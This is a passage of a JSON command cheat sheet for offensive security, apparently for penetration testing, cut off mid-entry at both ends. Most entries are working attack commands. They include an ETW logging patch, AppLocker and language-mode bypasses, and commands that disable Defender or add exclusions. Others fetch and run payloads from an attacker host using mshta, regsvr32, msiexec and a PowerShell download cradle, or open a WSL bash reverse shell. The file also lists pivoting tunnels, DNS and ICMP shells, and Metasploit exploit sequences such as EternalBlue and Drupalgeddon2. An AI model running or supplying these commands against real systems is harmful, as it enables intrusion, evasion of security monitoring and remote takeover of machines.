            "tags": [
              "essential"
            ]
          },
          {
            "title": "ETW Patch",
            "desc": "Patch ETW to evade logging",
            "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');$b=$a.GetValue($null);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($b,0)",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "AppLocker & CLM Bypass",
        "commands": [
          {
            "title": "AppLocker Policy Check",
            "desc": "View current AppLocker policy",
            "cmd": "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSBuild AppLocker Bypass",
            "desc": "Execute C# code via MSBuild (whitelisted)",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj",
            "tags": [
              "essential"
            ],
            "note": "Create .csproj file with embedded C# shellcode runner"
          },
          {
            "title": "InstallUtil AppLocker Bypass",
            "desc": "Execute .NET assembly via InstallUtil",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Regsvcs AppLocker Bypass",
            "desc": "Execute .NET assembly via regsvcs",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Regasm AppLocker Bypass",
            "desc": "Execute .NET assembly via regasm",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "CLM Bypass via PSBypassCLM",
            "desc": "Bypass Constrained Language Mode with custom runspace",
            "cmd": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Binary Obfuscation",
        "commands": [
          {
            "title": "Certutil Download",
            "desc": "Download files using Windows certutil",
            "cmd": "certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\temp\\shell.exe",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Certutil Base64 Decode",
            "desc": "Decode base64-encoded payload with certutil",
            "cmd": "certutil -decode encoded.b64 payload.exe",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSHTA Execution",
            "desc": "Execute HTA payload via mshta",
            "cmd": "mshta http://<LHOST>/shell.hta",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "MSHTA Inline VBScript",
            "desc": "Execute inline VBScript via mshta",
            "cmd": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\", 0:close\")",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Rundll32 Execution",
            "desc": "Execute DLL payload via rundll32",
            "cmd": "rundll32.exe shell.dll,EntryPoint",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Wscript Execution",
            "desc": "Execute script via Windows Script Host",
            "cmd": "wscript /e:vbscript C:\\temp\\payload.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Cscript Execution",
            "desc": "Execute script via cscript",
            "cmd": "cscript //nologo C:\\temp\\payload.vbs",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Chameleon Python Obfuscator",
            "desc": "Obfuscate Python scripts for AV evasion",
            "cmd": "python3 chameleon.py -f payload.py -o obfuscated.py",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Nimcrypt2 PE Packer",
            "desc": "Pack and encrypt PE with Nim loader",
            "cmd": "nimcrypt2 -f shell.exe -t csharp -o packed.exe",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Regsvr32 AppLocker Bypass",
            "desc": "Execute COM scriptlet via regsvr32",
            "cmd": "regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll",
            "tags": [
              "advanced"
            ],
            "note": "Host .sct file on attacker with embedded VBScript/JScript"
          },
          {
            "title": "XSL Script Processing",
            "desc": "Execute code via WMIC XSL transform",
            "cmd": "wmic os get /FORMAT:\"http://<LHOST>/payload.xsl\"",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Disable Windows Defender (Admin)",
            "desc": "Disable real-time protection if admin",
            "cmd": "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "tags": [
              "essential"
            ],
            "note": "Requires local admin privileges"
          },
          {
            "title": "Add Defender Exclusion Path",
            "desc": "Add exclusion to avoid scanning payload directory",
            "cmd": "powershell -c \"Add-MpPreference -ExclusionPath 'C:\\Temp'\"",
            "tags": [
              "essential"
            ],
            "note": "Requires local admin privileges"
          },
          {
            "title": "Add Defender Exclusion Process",
            "desc": "Exclude a process from Defender scanning",
            "cmd": "powershell -c \"Add-MpPreference -ExclusionProcess 'payload.exe'\"",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Living Off The Land (LOLBins)",
        "commands": [
          {
            "title": "LOL mshta",
            "desc": "Execute HTA payload",
            "cmd": "mshta http://<ATTACKER_IP>/payload.hta",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LOL regsvr32",
            "desc": "Execute SCT file",
            "cmd": "regsvr32 /s /n /u /i:http://<ATTACKER_IP>/payload.sct scrobj.dll",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LOL cmstp",
            "desc": "Execute INF payload",
            "cmd": "cmstp.exe /ni /s payload.inf",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "LOL forfiles",
            "desc": "Execute via forfiles",
            "cmd": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c <COMMAND>\"",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "LOL msiexec",
            "desc": "Execute MSI remotely",
            "cmd": "msiexec /q /i http://<ATTACKER_IP>/payload.msi",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LOL bash.exe (WSL)",
            "desc": "Execute via WSL",
            "cmd": "bash.exe -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'",
            "tags": [
              "tool"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "pivoting",
    "name": "Network Pivoting & Traffic Routing",
    "icon": "🔀",
    "description": "Route traffic through compromised hosts to reach internal networks using SSH tunnels, SOCKS proxies, and specialized pivoting tools.",
    "subcategories": [
      {
        "name": "SSH Forwarding",
        "commands": [
          {
            "title": "SSH Local Port Forward",
            "desc": "Forward local port to remote service through SSH",
            "cmd": "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "note": "Access remote service at localhost:<LOCAL_PORT>"
          },
          {
            "title": "SSH Remote Port Forward",
            "desc": "Expose attacker service to internal network",
            "cmd": "ssh -R <PIVOT_PORT>:<ATTACKER_IP>:<ATTACKER_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Dynamic SOCKS Proxy",
            "desc": "Create SOCKS proxy through SSH tunnel",
            "cmd": "ssh -D 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "note": "Configure proxychains to use socks5 127.0.0.1 1080"
          },
          {
            "title": "SSH Jump Host",
            "desc": "SSH through a jump host to reach final target",
            "cmd": "ssh -J <USER>@<PIVOT_IP> <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Local Forward (Background)",
            "desc": "Run SSH tunnel in background",
            "cmd": "ssh -f -N -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Dynamic SOCKS (Background)",
            "desc": "Background SOCKS proxy",
            "cmd": "ssh -f -N -D 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSHuttle VPN-like Tunnel",
            "desc": "Route traffic through SSH like a VPN",
            "cmd": "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SSHuttle Exclude Subnet",
            "desc": "Route with excluded networks",
            "cmd": "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24 -x <PIVOT_IP>/32",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SSH with Key and Forward",
            "desc": "SSH tunnel using key authentication",
            "cmd": "ssh -i id_rsa -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP> -fN",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Multi-Hop Jump",
            "desc": "Jump through multiple hosts",
            "cmd": "ssh -J <USER1>@<JUMP1>,<USER2>@<JUMP2> <USER3>@<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSH Background SOCKS",
            "desc": "Background SOCKS proxy",
            "cmd": "ssh -NfD 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Autossh Persistent",
            "desc": "Auto-reconnecting tunnel",
            "cmd": "autossh -M 0 -o 'ServerAliveInterval 30' -NfD 1080 <USER>@<PIVOT_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "sshpass Inline",
            "desc": "SSH with inline password",
            "cmd": "sshpass -p '<PASS>' ssh -o StrictHostKeyChecking=no <USER>@<TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Chisel Tunnels",
        "commands": [
          {
            "title": "Chisel Server (Attacker)",
            "desc": "Start chisel server on attacker machine",
            "cmd": "chisel server --reverse --port 8080",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Chisel SOCKS Proxy (Client)",
            "desc": "Create reverse SOCKS proxy from target",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:socks",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Creates SOCKS5 proxy on attacker at 127.0.0.1:1080"
          },
          {
            "title": "Chisel Reverse Port Forward",
            "desc": "Forward specific port back to attacker",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Chisel Forward Port",
            "desc": "Forward local port to remote service",
            "cmd": "./chisel client <ATTACKER_IP>:8080 <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Chisel Multiple Tunnels",
            "desc": "Create multiple tunnels in single connection",
            "cmd": "./chisel client <ATTACKER_IP>:8080 R:socks R:8888:<TARGET_IP>:80 R:4444:<TARGET_IP>:445",
            "tags": [
              "advanced",
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Ligolo-ng",
        "commands": [
          {
            "title": "Ligolo-ng Create TUN Interface",
            "desc": "Create TUN interface on attacker (Linux)",
            "cmds": [
              "sudo ip tuntap add user $(whoami) mode tun ligolo",
              "sudo ip link set ligolo up"
            ],
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Ligolo-ng Start Proxy",
            "desc": "Start ligolo-ng proxy on attacker",
            "cmd": "sudo ./proxy -selfcert -laddr 0.0.0.0:11601",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Ligolo-ng Agent Connect",
            "desc": "Run agent on compromised host to connect back",
            "cmd": "./agent -connect <ATTACKER_IP>:11601 -ignore-cert",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Ligolo-ng Add Route",
            "desc": "Add route to access internal network",
            "cmd": "sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Ligolo-ng Start Tunnel",
            "desc": "Start the tunnel from ligolo proxy console",
            "cmds": [
              "# In ligolo proxy console:",
              "session",
              "# Select the agent session",
              "start"
            ],
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Ligolo-ng Add Listener",
            "desc": "Add a listener on the agent for reverse connections",
            "cmd": "# In ligolo proxy console:\nlistener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "Allows catching reverse shells through the tunnel"
          }
        ]
      },
      {
        "name": "SOCKS Proxying",
        "commands": [
          {
            "title": "Proxychains Configuration",
            "desc": "Configure proxychains for SOCKS proxy",
            "cmds": [
              "# Edit /etc/proxychains4.conf:",
              "# Add at the bottom:",
              "socks5 127.0.0.1 1080"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains Nmap",
            "desc": "Run nmap through SOCKS proxy",
            "cmd": "proxychains -q nmap -sT -Pn -n <TARGET_IP> -p 21,22,80,443,445,3389",
            "tags": [
              "essential"
            ],
            "note": "Only TCP connect scan (-sT) works through proxychains"
          },
          {
            "title": "Proxychains Curl",
            "desc": "Access web service through proxy",
            "cmd": "proxychains -q curl http://<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains Evil-WinRM",
            "desc": "Connect to WinRM through proxy",
            "cmd": "proxychains -q evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains CrackMapExec",
            "desc": "Run CrackMapExec through proxy",
            "cmd": "proxychains -q crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains SMBClient",
            "desc": "Connect to SMB share through proxy",
            "cmd": "proxychains -q smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains SSH",
            "desc": "SSH through SOCKS proxy",
            "cmd": "proxychains -q ssh <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Proxychains RDP",
            "desc": "RDP through SOCKS proxy",
            "cmd": "proxychains -q xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "cURL through SOCKS",
            "desc": "HTTP via SOCKS",
            "cmd": "curl --socks5 127.0.0.1:1080 http://<INTERNAL_IP>/",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Impacket through Proxy",
            "desc": "Impacket via SOCKS",
            "cmd": "proxychains impacket-psexec <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Evil-WinRM through Proxy",
            "desc": "WinRM via SOCKS",
            "cmd": "proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "CME through Proxy",
            "desc": "CrackMapExec via SOCKS",
            "cmd": "proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Windows Port Forwards",
        "commands": [
          {
            "title": "Netsh Port Forward Add",
            "desc": "Create port forward using netsh",
            "cmd": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT> connectaddress=<TARGET_IP> connectport=<TARGET_PORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netsh Show Port Forwards",
            "desc": "List all active port forwards",
            "cmd": "netsh interface portproxy show all",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netsh Delete Port Forward",
            "desc": "Remove a port forward rule",
            "cmd": "netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netsh Firewall Allow Port",
            "desc": "Open firewall port for the forward",
            "cmd": "netsh advfirewall firewall add rule name=\"Forward\" dir=in action=allow protocol=tcp localport=<LISTEN_PORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Plink Local Forward",
            "desc": "PuTTY plink for SSH local port forward",
            "cmd": "plink.exe -ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Plink Remote Forward",
            "desc": "PuTTY plink for SSH remote port forward",
            "cmd": "plink.exe -ssh -R <ATTACKER_PORT>:127.0.0.1:<LOCAL_PORT> <USER>@<ATTACKER_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Plink Dynamic SOCKS",
            "desc": "PuTTY plink for dynamic SOCKS proxy",
            "cmd": "plink.exe -ssh -D 1080 <USER>@<ATTACKER_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Other Tunneling Tools",
        "commands": [
          {
            "title": "Socat Port Forward",
            "desc": "Forward port using socat",
            "cmd": "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Socat Port Forward (Background)",
            "desc": "Background socat forwarder",
            "cmd": "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT> &",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Netcat Relay (mkfifo)",
            "desc": "Create netcat relay for port forwarding",
            "cmd": "mkfifo /tmp/relay; nc -lvnp <LISTEN_PORT> < /tmp/relay | nc <TARGET_IP> <TARGET_PORT> > /tmp/relay",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Rpivot Server (Attacker)",
            "desc": "Start rpivot SOCKS server on attacker",
            "cmd": "python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Rpivot Client (Target)",
            "desc": "Connect rpivot client to attacker server",
            "cmd": "python client.py --server-ip <ATTACKER_IP> --server-port 9999",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Dnscat2 Server",
            "desc": "Start DNS tunnel server",
            "cmd": "ruby dnscat2.rb <DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Dnscat2 Client",
            "desc": "Connect via DNS tunnel from target",
            "cmd": "dnscat2 <DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Iodine DNS Tunnel Server",
            "desc": "Create IP-over-DNS tunnel server",
            "cmd": "iodined -f -c -P <PASS> 10.0.0.1 <TUNNEL_DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Iodine DNS Tunnel Client",
            "desc": "Connect to IP-over-DNS tunnel",
            "cmd": "iodine -f -P <PASS> <TUNNEL_DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "ICMP Shell (icmpsh)",
            "desc": "Start ICMP-based reverse shell listener",
            "cmds": [
              "# Attacker:",
              "python icmpsh_m.py <ATTACKER_IP> <TARGET_IP>",
              "# Target (Windows):",
              "icmpsh.exe -t <ATTACKER_IP>"
            ],
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Neo-reGeorg Tunnel",
            "desc": "Web-based tunnel via uploaded web shell",
            "cmds": [
              "# Generate tunnel webshell:",
              "python neoreg.py generate -k <PASSWORD>",
              "# Upload tunnel.php/aspx/jsp to target, then:",
              "python neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php"
            ],
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "Invoke-SocksProxy (PowerShell)",
            "desc": "Create SOCKS proxy on Windows via PowerShell",
            "cmd": "Import-Module .\\Invoke-SocksProxy.psm1; Invoke-SocksProxy -bindPort 1080",
            "tags": [
              "advanced",
              "tool"
            ]
          },
          {
            "title": "FPipe Port Forward (Windows)",
            "desc": "Port forwarding tool for Windows",
            "cmd": "fpipe.exe -l <LISTEN_PORT> -r <TARGET_PORT> <TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Double Pivoting",
        "commands": [
          {
            "title": "Double Pivot SSH",
            "desc": "Chain two SSH tunnels",
            "cmds": [
              "# First hop: ssh -NfD 1080 <USER1>@<PIVOT1>",
              "# Second hop: proxychains ssh -NfD 1081 <USER2>@<PIVOT2>",
              "# Use: proxychains4 -f proxy2.conf nmap -sT -Pn <DEEP_TARGET>"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Double Pivot Chisel",
            "desc": "Chain Chisel tunnels",
            "cmds": [
              "# Attacker: chisel server --reverse -p 8000",
              "# Pivot1: chisel client <ATTACKER_IP>:8000 R:1080:socks",
              "# Pivot2: proxychains chisel client <PIVOT2>:8001 R:1081:socks"
            ],
            "tags": [
              "advanced"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "metasploit",
    "name": "Metasploit Operations",
    "icon": "🔧",
    "description": "Metasploit Framework for exploitation, post-exploitation, and pivoting",
    "subcategories": [
      {
        "name": "Framework Setup & Navigation",
        "commands": [
          {
            "title": "Initialize Metasploit Database",
            "cmd": "sudo msfdb init",
            "tags": [
              "essential"
            ],
            "desc": "Initialize the PostgreSQL database for Metasploit"
          },
          {
            "title": "Start Metasploit Database",
            "cmd": "sudo msfdb start",
            "tags": [
              "essential"
            ],
            "desc": "Start the Metasploit database service"
          },
          {
            "title": "Launch Metasploit Console",
            "cmd": "msfconsole -q",
            "tags": [
              "essential"
            ],
            "desc": "Start Metasploit Framework console in quiet mode"
          },
          {
            "title": "Check Database Status",
            "cmd": "db_status",
            "tags": [
              "essential"
            ],
            "desc": "Verify database connectivity inside msfconsole"
          },
          {
            "title": "Create Workspace",
            "cmd": "workspace -a <PROJECT_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Create a new workspace to organize engagements"
          },
          {
            "title": "List Workspaces",
            "cmd": "workspace",
            "tags": [
              "essential"
            ],
            "desc": "List all available workspaces"
          },
          {
            "title": "Switch Workspace",
            "cmd": "workspace <PROJECT_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Switch to a specific workspace"
          },
          {
            "title": "Delete Workspace",
            "cmd": "workspace -d <PROJECT_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Delete a workspace and its associated data"
          },
          {
            "title": "Search for Modules",
            "cmd": "search type:exploit platform:windows <KEYWORD>",
            "tags": [
              "essential"
            ],
            "desc": "Search for exploit modules by keyword and platform"
          },
          {
            "title": "Search CVE",
            "cmd": "search cve:<CVE_YEAR>-<CVE_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Search modules by CVE identifier"
          },
          {
            "title": "Use a Module",
            "cmd": "use exploit/windows/smb/ms17_010_eternalblue",
            "tags": [
              "essential"
            ],
            "desc": "Select a module to configure and run"
          },
          {
            "title": "Show Module Info",
            "cmd": "info",
            "tags": [
              "essential"
            ],
            "desc": "Display detailed information about the selected module"
          },
          {
            "title": "Show Module Options",
            "cmd": "show options",
            "tags": [
              "essential"
            ],
            "desc": "Display configurable options for the current module"
          },
          {
            "title": "Show Available Payloads",
            "cmd": "show payloads",
            "tags": [
              "essential"
            ],
            "desc": "List compatible payloads for the current exploit"
          },
          {
            "title": "Show Targets",
            "cmd": "show targets",
            "tags": [
              "tool"
            ],
            "desc": "List available target configurations for the exploit"
          },
          {
            "title": "Set Module Option",
            "cmd": "set RHOSTS <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Set a module-specific option"
          },
          {
            "title": "Set Global Option",
            "cmd": "setg RHOSTS <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Set a global option persisting across modules"
          },
          {
            "title": "Import Nmap Scan",
            "cmd": "db_nmap -sV -O <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Run nmap and import results directly into the database"
          },
          {
            "title": "Import External Scan",
            "cmd": "db_import /path/to/scan.xml",
            "tags": [
              "tool"
            ],
            "desc": "Import nmap/Nessus/etc. XML results into the workspace"
          },
          {
            "title": "List Discovered Hosts",
            "cmd": "hosts",
            "tags": [
              "tool"
            ],
            "desc": "Show all hosts stored in the current workspace database"
          },
          {
            "title": "List Discovered Services",
            "cmd": "services",
            "tags": [
              "tool"
            ],
            "desc": "Show all services found in the current workspace"
          },
          {
            "title": "List Stored Credentials",
            "cmd": "creds",
            "tags": [
              "tool"
            ],
            "desc": "Show all credentials gathered in the workspace"
          },
          {
            "title": "List Loot",
            "cmd": "loot",
            "tags": [
              "tool"
            ],
            "desc": "Show all loot (files, hashes) collected in the workspace"
          }
        ]
      },
      {
        "name": "Exploitation Modules",
        "commands": [
          {
            "title": "EternalBlue (MS17-010)",
            "cmds": [
              "use exploit/windows/smb/ms17_010_eternalblue",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "set payload windows/x64/meterpreter/reverse_tcp",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Exploit MS17-010 SMB vulnerability for remote code execution"
          },
          {
            "title": "PsExec Module",
            "cmds": [
              "use exploit/windows/smb/psexec",
              "set RHOSTS <TARGET_IP>",
              "set SMBUser <USER>",
              "set SMBPass <PASS>",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Authenticate and execute payload via SMB PsExec"
          },
          {
            "title": "Web Delivery (PowerShell)",
            "cmds": [
              "use exploit/multi/script/web_delivery",
              "set target 2",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Host a payload for download and execution via PowerShell one-liner"
          },
          {
            "title": "Web Delivery (Python)",
            "cmds": [
              "use exploit/multi/script/web_delivery",
              "set target 0",
              "set payload python/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Host a payload for download and execution via Python one-liner"
          },
          {
            "title": "Java RMI Server",
            "cmds": [
              "use exploit/multi/misc/java_rmi_server",
              "set RHOSTS <TARGET_IP>",
              "set payload java/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit Java RMI registry for code execution"
          },
          {
            "title": "Tomcat Manager Upload",
            "cmds": [
              "use exploit/multi/http/tomcat_mgr_upload",
              "set RHOSTS <TARGET_IP>",
              "set RPORT 8080",
              "set HttpUsername <USER>",
              "set HttpPassword <PASS>",
              "set payload java/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Deploy a WAR payload through Tomcat Manager"
          },
          {
            "title": "Multi/Handler Listener",
            "cmds": [
              "use exploit/multi/handler",
              "set payload windows/x64/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a background listener for incoming reverse shells"
          },
          {
            "title": "Multi/Handler (Linux)",
            "cmds": [
              "use exploit/multi/handler",
              "set payload linux/x64/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a background listener for Linux reverse meterpreter"
          },
          {
            "title": "Run Exploit as Background Job",
            "cmd": "exploit -j",
            "tags": [
              "essential"
            ],
            "desc": "Launch the current exploit as a background job"
          },
          {
            "title": "HTA Server Delivery",
            "cmds": [
              "use exploit/windows/misc/hta_server",
              "set SRVHOST <ATTACKER_IP>",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit -j"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Serve an HTA payload for client-side exploitation"
          },
          {
            "title": "MS08-067 NetAPI",
            "cmds": [
              "use exploit/windows/smb/ms08_067_netapi",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit the classic MS08-067 Windows vulnerability"
          },
          {
            "title": "PHP CGI Argument Injection",
            "cmds": [
              "use exploit/multi/http/php_cgi_arg_injection",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit PHP-CGI argument injection (CVE-2012-1823)"
          },
          {
            "title": "Rejetto HFS RCE",
            "cmds": [
              "use exploit/windows/http/rejetto_hfs_exec",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit Rejetto HTTP File Server for remote code execution"
          },
          {
            "title": "Drupalgeddon2",
            "desc": "Drupal RCE",
            "cmds": [
              "use exploit/unix/webapp/drupal_drupalgeddon2",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Jenkins Script Console",
            "desc": "Jenkins Groovy RCE",
            "cmds": [
              "use exploit/multi/http/jenkins_script_console",
              "set RHOSTS <TARGET_IP>",
              "set RPORT 8080",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WordPress Admin Upload",
            "desc": "WP shell upload",
            "cmds": [
              "use exploit/unix/webapp/wp_admin_shell_upload",
